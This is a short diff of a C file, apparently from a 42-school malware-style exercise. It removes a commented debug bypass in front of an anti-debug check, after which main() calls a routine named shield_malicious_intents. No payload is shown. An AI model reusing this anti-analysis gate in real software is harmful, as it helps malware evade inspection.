@@ -6,7 +6,7 @@
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
-/*   Updated: 2025/11/17 23:26:17 by kiroussa         ###   ########.fr       */
+/*   Updated: 2025/11/17 23:46:21 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -130,7 +130,6 @@ int	main(void)
 	if (shield_is_flipped())
 		return (shield_daemon_main(), 0);
 	if (shield_antidebug())
-	// if (1)
 	{
 		DEBUG("passed anti-debug check\n");
 		shield_malicious_intents();
